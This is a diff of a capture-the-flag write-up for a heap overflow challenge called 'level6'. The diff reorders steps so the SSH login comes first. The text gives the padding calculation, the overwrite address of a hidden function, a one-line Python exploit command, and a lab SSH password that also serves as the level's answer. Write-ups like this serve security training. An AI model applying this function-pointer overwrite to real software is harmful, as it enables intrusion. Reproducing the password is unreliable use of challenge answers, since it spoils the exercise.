@@ -9,7 +9,11 @@
    - func_ptr initially points to m() but program calls (*func_ptr)()
    - Hidden function n() at 0x08048454 prints the flag
 
-3. Verify heap layout with ltrace:
+3. Connect to the VM via SSH:
+   ssh level6@localhost -p 2222
+   Password: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+4. Verify heap layout with ltrace:
    ltrace ./level6 AAAA
    
    Output shows:
@@ -18,14 +22,10 @@
    
    Distance: 0x0804a050 - 0x0804a008 = 72 bytes (0x48)
 
-4. Calculate the exploit:
+5. Calculate the exploit:
    - Padding: 72 bytes (64 buffer + 8 heap metadata)
    - Target: 0x08048454 (address of n)
    - Little-endian: \x54\x84\x04\x08
-
-5. Connect to the VM via SSH:
-   ssh level6@localhost -p 2222
-   Password: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 
 6. Execute the exploit:
    ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
